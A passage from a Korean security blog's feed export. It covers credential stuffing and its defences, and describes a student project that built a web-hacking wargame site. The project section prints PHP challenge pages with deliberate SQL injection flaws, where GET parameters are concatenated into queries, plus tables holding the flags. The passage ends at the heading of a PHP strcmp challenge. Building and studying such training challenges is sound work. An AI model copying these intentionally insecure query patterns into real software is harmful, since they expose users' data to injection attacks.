<p><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">상세 페이지</a></p>
</div>

<br>

<br>

<hr>
<p><strong>참고</strong></p>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/OWASP/owasp.svg"></object>
<p>OWASP TOP 10</p><p>Open Web Application Security Project</p>
<a href="https://owasp.org/Top10/#whats-changed-in-the-top-10-for-2021"></a>
</div></div>

]]></content>
      <categories>
        <category>보안용어</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>OWASP</tag>
        <tag>보안용어</tag>
      </tags>
  </entry>
  <entry>
    <title>크레덴셜 스터핑 (Credential Stuffing)</title>
    <url>/2021/09/21/2021-09-21-%ED%81%AC%EB%A0%88%EB%8D%B4%EC%85%9C%20%EC%8A%A4%ED%84%B0%ED%95%91%20(Credential%20Stuffing)/</url>
    <content><![CDATA[<h1 id="🤔-크레덴셜-스터핑이란"><a href="#🤔-크레덴셜-스터핑이란" class="headerlink" title="🤔 크레덴셜 스터핑이란?"></a>🤔 크레덴셜 스터핑이란?</h1><br>

<mark class="label success">무차별 대입 공격(Brute force)</mark>과 <mark class="label info">사전 공격(Dictionary Attack)</mark> 등 과 마찬가지로 <u>사용자의 계정을 탈취</u>하는 공격 유형 중 하나입니다.

<mark class="label info">사전 공격(Dictionary Attack)</mark>과 다른 점은 <mark class="label info">사전 공격(Dictionary Attack)</mark>은 쓸만한 비밀번호를 사전처럼 모아두고 그 모아둔 목록을 자동화 공격 툴을 이용해 대입하는 공격이지만 <mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark>은 <u>이미 유출된 아이디와 비밀번호</u>를 이용해 다른 사이트에 자동화 기술로 대입하는 것입니다.

<br>

<br>

<h2 id="특징"><a href="#특징" class="headerlink" title="특징"></a>특징</h2><br>

<mark class="label success">무차별 대입 공격(Brute force)</mark>과 <mark class="label info">사전 공격(Dictionary Attack)</mark> 같은 경우 대입하는 횟수가 많아 탐지되기가 쉽지만 <mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark>은 <u>대입하는 횟수가 많지 않아</u> 탐지되기 쉽지 않고 눈에 띄지 않습니다.

<br>

<br>

<hr>
<br>

<h1 id="🧨-크레덴셜-스터핑-공격으로-인한-피해"><a href="#🧨-크레덴셜-스터핑-공격으로-인한-피해" class="headerlink" title="🧨 크레덴셜 스터핑 공격으로 인한 피해"></a>🧨 크레덴셜 스터핑 공격으로 인한 피해</h1><br>

<mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark> 공격에 성공한 공격자는 그 계정을 이용해 사기 범죄를 일으킬 수 있습니다.

<p>혹시나 탈취한 계정의 권한이 높거나 관리자의 계정일 경우에는 DB까지 만지거나 탈취 또한 가능하기 때문에 피해자는 큰 손해를 입습니다.</p>
<br>

<br>

<h2 id="크레덴셜-스터핑-피해-사례"><a href="#크레덴셜-스터핑-피해-사례" class="headerlink" title="크레덴셜 스터핑 피해 사례"></a>크레덴셜 스터핑 피해 사례</h2><br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안용어/크레덴셜 스터핑/logo.png"></object>
<p>크레덴셜 스터핑 피해 사례</p><p>보안뉴스</p>
<a href="https://www.boannews.com/media/view.asp?idx=83369&page=1&kind=1"></a>
</div></div>

<br>

<br>

<hr>
<br>

<h1 id="😄-크레덴셜-스터핑-방어-및-예방법"><a href="#😄-크레덴셜-스터핑-방어-및-예방법" class="headerlink" title="😄 크레덴셜 스터핑 방어 및 예방법"></a>😄 크레덴셜 스터핑 방어 및 예방법</h1><br>

<mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark> 공격의 방어와 예방법을 크게 두 가지로 나누어봤습니다.

<p>첫 번째는 <code>기업</code> 관점에서의 방어와 에방법 두 번째는 <code>사용자(개인)</code> 관점에서의 예방법으로 나누어봤습니다.</p>
<br>

<br>

<h2 id="기업-관점에서의-방법과-예방법"><a href="#기업-관점에서의-방법과-예방법" class="headerlink" title="기업 관점에서의 방법과 예방법"></a>기업 관점에서의 방법과 예방법</h2><br>

<ul>
<li><mark class="label danger">크레덴셜 스터핑(Credential Stuffing)</mark> 공격은 자동화 툴을 이용해 공격하는게 일반적이므로 제한된 시간 안에 로그인 시도가 증가하고, 트래픽의 변화가 생기고, 평소보다 로그인 실패 빈도가 높아집니다.
그러므로 탐지를 통해 방어를 해야 합니다.</li>
<li>캡챠 같은 인증 방법을 통해 봇을 차단하는 방법이 있습니다.</li>
<li>2차 비밀번호와 같은 2단계 인증을 통해 예방을 합니다.<br>다중 인증 옵션을 사용 중인 계정의 해킹 방직 성공률은 99.9%라고 합니다.</li>
<li>회원 가입 시 비밀번호 조합을 강력하게 하도록 설정해두어야 합니다.</li>
</ul>
<br>

<br>

<h2 id="사용자-개인-관점에서의-예방법"><a href="#사용자-개인-관점에서의-예방법" class="headerlink" title="사용자(개인) 관점에서의 예방법"></a>사용자(개인) 관점에서의 예방법</h2><br>

<ul>
<li>사이트에 다중 인증 옵션이 있을 경우 사용합니다.</li>
<li>각 사이트 별로 다른 비밀번호를 사용해야 합니다.</li>
<li>비밀번호는 영문, 숫자, 특수 문자, 영어 대문자를 포함하여 강력하게 만들어야 합니다.</li>
</ul>
<br>

<br>

<h2 id="패스워드-모니터-기능"><a href="#패스워드-모니터-기능" class="headerlink" title="패스워드 모니터 기능"></a>패스워드 모니터 기능</h2><br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/보안용어/크레덴셜 스터핑/logo.png"></object>
<p>패스워드 모니터</p><p>보안뉴스</p>
<a href="https://www.boannews.com/media/view.asp?idx=97978"></a>
</div></div>

<br>

<p><strong>기사 내용 요약</strong></p>
<p>엣지 브라우저에서의 ‘패스워드 모니터’ 기능을 키면 다크웹 등 을 스캔해 사용자의 계정 정보가 유출됐는지 파악하고 그것을 알려 주는 기능이 있다고 알려 주는 내용입니다.</p>
]]></content>
      <categories>
        <category>보안용어</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>보안용어</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL</title>
    <url>/2021/09/23/2021-09-23-NoSQL/</url>
    <content><![CDATA[<p>작성중 …</p>
]]></content>
      <categories>
        <category>보안용어</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>보안용어</tag>
      </tags>
  </entry>
  <entry>
    <title>[프로젝트] Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성</title>
    <url>/2021/09/19/2021-09-19-%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8_Wargame%20%EC%82%AC%EC%9D%B4%ED%8A%B8%20%EC%A0%9C%EC%9E%91%20%EB%B0%8F%20%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%20%EC%A7%84%EB%8B%A8%20%ED%9B%84%20%EB%B3%B4%EA%B3%A0%EC%84%9C%20%EC%9E%91%EC%84%B1/</url>
    <content><![CDATA[<h1 id="🧶-프로젝트-개요"><a href="#🧶-프로젝트-개요" class="headerlink" title="🧶 프로젝트 개요"></a>🧶 프로젝트 개요</h1><p><br>Web, Reversing, Forensic, System 등 여러 분야의 해킹 기법을 학습하고 연습할 수 있는 Wargame 홈페이지를 제작하였습니다.<br>또한 해당 홈페이지에 대하여 모의 해킹 진단(침투테스트)을 수행하여 보고서를 쓰고, 취약한 부분에 대하여는 Secure Coding을 통하여 보완하였습니다.</p>
<br>

<br>

<h2 id="해당-프로젝트를-한-이유"><a href="#해당-프로젝트를-한-이유" class="headerlink" title="해당 프로젝트를 한 이유?"></a>해당 프로젝트를 한 이유?</h2><p><br>직접 사이트를 만들어보면서 PHP에 대한 이해와 DB에 대한 이해를 할 수 있고, 직접 워게임 문제를 만들어보면서 다양한 해킹 기법을 공부할 수 있다고 생각되어 이 프로젝트를 하게 되었습니다.</p>
<br>

<br>

<h2 id="프로젝트-진행-기간-amp-일정"><a href="#프로젝트-진행-기간-amp-일정" class="headerlink" title="프로젝트 진행 기간 &amp; 일정"></a>프로젝트 진행 기간 &amp; 일정</h2><pre class="mermaid">
gantt

dateFormat  YYYY-MM-DD

section 진행 기간

워게임 사이트 제작 :done,  des1, 2021-06-22,2021-07-02

워게임 Web 문제 제작:active, des2, 2021-07-02,2021-07-20

게시판 제작 및 기능 구현:         des3, 2021-07-15,2021-07-23

게시판 모의해킹 보고서 작성:active, des4, 2021-07-23,2021-08-06

보고서 취합 및 시큐어 코딩:done, des5, 2021-08-03,2021-08-13

발표 준비 및 발표:     des6, 2021-08-10, 2021-08-19

</pre>

<br>

<p>프로젝트는 <code>2021년 6월 22일</code>부터 <code>2021년 8월 19일</code>까지 진행되었으며 총 <code>8주차</code> 진행하였습니다.</p>
<p><code>0 ~ 1.5</code>주차 : 워게임 사이트 제작 및 기능 구현을 하였습니다.</p>
<p><code>1.5 ~ 4</code>주차 : 워게임 Web 문제를 제작하였습니다.</p>
<p><code>3.2 ~ 4.2</code>주차 : 게시판 제작 및 기능 구현을 하였습니다.</p>
<p><code>4.3 ~ 6.5</code>주차 : 게시판 모의해킹 및 보고서를 작성하였습니다.</p>
<p><code>6 ~ 7.2</code>주차 : 팀원 별로 작성한 보고서를 취합하고 시큐어 코딩을 했습니다.</p>
<p><code>7 ~ 8</code>주차 : 발표 준비 및 발표를 하였습니다.</p>
<br>

<br>

<h2 id="프로젝트-진행-환경"><a href="#프로젝트-진행-환경" class="headerlink" title="프로젝트 진행 환경"></a>프로젝트 진행 환경</h2><p><br><div class="note default"><h3 id="운영체제-amp-가상화"><a href="#운영체제-amp-가상화" class="headerlink" title="운영체제 &amp; 가상화"></a>운영체제 &amp; 가상화</h3><p>APM 환경은 <code>AWS EC2 Ubuntu 20.04.2 LTS</code>에 구축하였습니다.<br>워게임 문제같은 경우에는 <code>Docker</code>를 사용하였습니다.<br>해당 사이트 모의 해킹에는 <code>Windows 10</code>과 <code>Kali</code>를 사용하였습니다.</p>
</div></p>
<br>

<div class="note default"><h3 id="도구"><a href="#도구" class="headerlink" title="도구"></a>도구</h3><p>코드를 작성하는 도구로는 <code>Putty</code>와 <code>Visual Studio Code</code>를 사용하였습니다.<br>로컬에서 작성한 코드를 서버로 옮기는 도구로는 <code>WinSCP</code>를 사용하였습니다.</p>
</div>

<br>

<div class="note default"><h3 id="프로그램"><a href="#프로그램" class="headerlink" title="프로그램"></a>프로그램</h3><p>모의해킹에 사용한 프로그램으로는 <code>WireShark</code>, <code>Burp Suite</code>, <code>Nmap</code>, <code>sqlmap</code>, <code>Nikto</code>, <code>WAFW00F</code>등을 사용하였습니다.</p>
</div>

<br>

<div class="note default"><h3 id="언어"><a href="#언어" class="headerlink" title="언어"></a>언어</h3><p>사용 언어로는 <code>PHP</code>, <code>HTML</code>, <code>CSS</code>, <code>MySQL</code>를 사용하였습니다.</p>
</div>

<br>

<br>

<h2 id="프로젝트-구성도"><a href="#프로젝트-구성도" class="headerlink" title="프로젝트 구성도"></a>프로젝트 구성도</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/diagram.svg">

<br>

<p>위 구성도와 같이 <code>AWS EC2</code>에 DB 서버인 <code>MySQL</code>과 <code>Apache Web Server</code>를 구축했습니다.</p>
<p>워게임 문제같은 경우에는 <code>Docker</code>에 구축하였습니다.</p>
<br>

<h3 id="왜-도커에-구축"><a href="#왜-도커에-구축" class="headerlink" title="왜 도커에 구축?"></a>왜 도커에 구축?</h3><p>워게임 문제같은 경우에는 문제 의도 상 취약하게 만들어야 합니다. 만약 같은 서버에서 서비스하게 되면 메인 시스템에 악영향을 끼치는 의도치 못한 상황이 발생할 수 있기 때문에 <code>Docker</code>에 구축하였습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🎈-워게임-사이트-제작-및-기능-구현"><a href="#🎈-워게임-사이트-제작-및-기능-구현" class="headerlink" title="🎈 워게임 사이트 제작 및 기능 구현"></a>🎈 워게임 사이트 제작 및 기능 구현</h1><br>

<h2 id="메인-페이지"><a href="#메인-페이지" class="headerlink" title="메인 페이지"></a>메인 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/main.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>메인 페이지입니다. 저희 팀 로고와 팀명이 있고 각 메뉴가 있습니다.</p>
</div>

<br>

<br>

<h2 id="회원가입-amp-로그인"><a href="#회원가입-amp-로그인" class="headerlink" title="회원가입 &amp; 로그인"></a>회원가입 &amp; 로그인</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/register.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/login.png"></div></div></div></p>
<br>

<div class="note default"><p>회원가입 페이지와 로그인 페이지입니다.</p>
<p>회원가입 페이지에는 <code>아이디</code>,<code>닉네임</code> 중복확인 버튼이 있고 <code>패스워드</code>를 입력하는 입력란이 있습니다.</p>
<p>로그인 페이지에는 <code>아이디</code>, <code>패스워드</code> 입력란이 있습니다.</p>
</div>

<br>

<br>

<h2 id="문제-풀이-페이지"><a href="#문제-풀이-페이지" class="headerlink" title="문제 풀이 페이지"></a>문제 풀이 페이지</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/challenges.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/challenges_2.png"></div></div></div></p>
<br>

<div class="note default"><p>워게임 문제 풀이 페이지입니다. 여러가지 카테고리가 있습니다.</p>
<p>프로젝트의 목표가 웹해킹이라서 다른 카테고리의 문제는 없습니다.</p>
</div>

<br>

<br>

<h2 id="랭킹-페이지"><a href="#랭킹-페이지" class="headerlink" title="랭킹 페이지"></a>랭킹 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/rank.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>랭킹 페이지 입니다. </p>
<p>문제 풀이에 따른 점수로 레벨과 순위가 공개됩니다.</p>
</div>

<br>

<br>

<h2 id="플래그-입력-페이지"><a href="#플래그-입력-페이지" class="headerlink" title="플래그 입력 페이지"></a>플래그 입력 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/auth.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>플래그 입력 페이지 입니다.</p>
<p>문제를 풀면 플래그가 나오는데 그 플래그를 입력하면 점수가 주어집니다.</p>
</div>

<br>

<br>

<h2 id="소개-amp-설명-페이지"><a href="#소개-amp-설명-페이지" class="headerlink" title="소개 &amp; 설명 페이지"></a>소개 &amp; 설명 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/about.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>저희 팀명 소개와 워게임 사이트 사용 방법을 적어놓은 페이지입니다.</p>
</div>

<br>

<br>

<h2 id="마이-페이지"><a href="#마이-페이지" class="headerlink" title="마이 페이지"></a>마이 페이지</h2><p><br><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/mypage.png" width="70%" heigth="70%"></p>
<br>

<div class="note default"><p>마이 페이지 입니다.</p>
<p>닉네임을 바꿀 수 있습니다. 닉네임을 바꿀려면 현재 비밀번호를 입력해야합니다.</p>
<p>비밀번호 또한 바꿀 수 있습니다. 마찬가지로 현재 비밀번호를 입력해야합니다.</p>
</div>

<br>

<br>

<hr>
<br>

<h1 id="🙄-워게임-Web-문제-제작"><a href="#🙄-워게임-Web-문제-제작" class="headerlink" title="🙄 워게임 Web 문제 제작"></a>🙄 워게임 Web 문제 제작</h1><br>

<p>총 14문제를 만들었고 그 중에서 몇 문제만 적었습니다.</p>
<br>

<br>

<h2 id="간단한-SQL-Injection"><a href="#간단한-SQL-Injection" class="headerlink" title="간단한 SQL Injection"></a>간단한 SQL Injection</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/simple_sqli.png">

<br>

<p>위와 같이 간단한 로그인 폼이 있고, 간단한 SQLi로 풀 수 있는 문제입니다.</p>
<p><code>소스</code>와 <code>DB</code>는 아래와 같습니다.</p>
<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$pw</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;~~&#x27;</span>, <span class="string">&#x27;~~&#x27;</span>, <span class="string">&#x27;~~&#x27;</span>, <span class="string">&#x27;~~&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from web1 where id=&#x27;<span class="subst">$id</span>&#x27; &amp;&amp; pw=&#x27;<span class="subst">$pw</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>=mysqli_fetch_array(mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>)))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$result</span>[2]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;login fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;kr&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;title&gt;php로그인&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form  method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      로그인&lt;/br&gt;</span><br><span class="line">      아이디 : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      비밀번호 : &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pw&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;로그인&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#DataBase</span><br><span class="line"></span><br><span class="line">+-------+----------+-------------------+</span><br><span class="line">| id    | pw       | flag              |</span><br><span class="line">+-------+----------+-------------------+</span><br><span class="line">| admin | anything | flag&#123;Simpl3_Sq1i&#125; |</span><br><span class="line">+-------+----------+-------------------+</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="UNION-SQL-Injection"><a href="#UNION-SQL-Injection" class="headerlink" title="UNION SQL Injection"></a>UNION SQL Injection</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_1.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_2.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_3.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/union_sqli_4.png">

<br>

<p><code>첫번째</code> 사진은 로그인 페이지와 shop 페이지로 들어갈 수 있는 메인 페이지입니다.</p>
<p><code>두번째</code> 사진은 로그인 페이지로 들어왔을 때 보이는 로그인 폼 입니다.</p>
<p><code>세번째</code> 사진은 shop 페이지로 들어갔을 때 보이는 상품 목록 입니다.</p>
<p><code>네번째</code> 사진은 최종적으로 UNION SQL Injection을 성공했을 때 나온 사진입니다.</p>
<br>

<p><code>소스</code>와 <code>DB</code>는 아래와 같습니다.</p>
<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#메인 페이지입니다. index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;shop&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from book&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$i</span> = mysqli_fetch_array(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;shop.php?list=&quot;</span>.<span class="variable">$i</span>[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;kr&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;title&gt;ShopMainPage&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">        &lt;h3&gt;&lt;a href=<span class="string">&quot;login.php&quot;</span>&gt;Login&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">        &lt;h3&gt;&lt;a href=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$url</span><span class="meta">?&gt;</span>&gt;Shop&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#로그인 페이지입니다. login.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_POST[&#x27;id&#x27;]=false;</span></span><br><span class="line"><span class="comment">//$_POST[&#x27;pw&#x27;]=false;</span></span><br><span class="line"><span class="keyword">if</span>((!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))||(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>])))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;nope!!!!&quot;</span>;</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;input ID &amp; PASSWORD !!!!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;kr&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">    &lt;title&gt;login?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">    &lt;form  method=<span class="string">&quot;POST&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">      ID : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      PASSWD : &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pw&quot;</span> /&gt;&lt;/br&gt;</span><br><span class="line">      &lt;br&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;LOGIN&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shop 페이지입니다. shop.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;~~&#x27;</span>,<span class="string">&#x27;shop&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_error())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Failed to Connect MySQL : &quot;</span>.mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$post = $_GET[&#x27;list&#x27;];</span></span><br><span class="line"><span class="variable">$par</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;list&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from book where idx =<span class="subst">$par</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;BOOK NAME : &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;bookname&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;PRICE : &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;STOCK : &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;count&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">//$i=$i+1;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#DataBase</span><br><span class="line"></span><br><span class="line">#테이블 목록</span><br><span class="line">+----------------+</span><br><span class="line">| Tables_in_shop |</span><br><span class="line">+----------------+</span><br><span class="line">| book           |</span><br><span class="line">| itemlist       |</span><br><span class="line">| shopusers      |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line">#book 테이블</span><br><span class="line">+-----+-----------+-------+-------+</span><br><span class="line">| idx | bookname  | price | count |</span><br><span class="line">+-----+-----------+-------+-------+</span><br><span class="line">|   1 | WEB       | 14000 |    35 |</span><br><span class="line">|   2 | REVERSING | 19000 |    13 |</span><br><span class="line">|   3 | PWNABLE   | 25000 |    43 |</span><br><span class="line">+-----+-----------+-------+-------+</span><br><span class="line"></span><br><span class="line">#itemlist 테이블</span><br><span class="line">+-----+----------+--------+---------+</span><br><span class="line">| idx | itemname | itemid | itemnum |</span><br><span class="line">+-----+----------+--------+---------+</span><br><span class="line">|   1 | book     | b      |       1 |</span><br><span class="line">|   2 | NULL     | b      |       1 |</span><br><span class="line">+-----+----------+--------+---------+</span><br><span class="line"></span><br><span class="line">#shopusers 테이블</span><br><span class="line">+-----+--------+------------------+----------+</span><br><span class="line">| idx | shopid | shoppass         | joindate |</span><br><span class="line">+-----+--------+------------------+----------+</span><br><span class="line">|   1 | admin  | flag&#123;Uni0n_sq1i&#125; |       30 |</span><br><span class="line">+-----+--------+------------------+----------+</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="PHP-strcmp-취약점"><a href="#PHP-strcmp-취약점" class="headerlink" title="PHP strcmp 취약점"></a>PHP strcmp 취약점</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/strcmp.png">

<br>

<p>PHP strcmp 취약점 문제입니다.</p>
<br>

<p><code>소스</code>는 아래와 같습니다.</p>
<br>

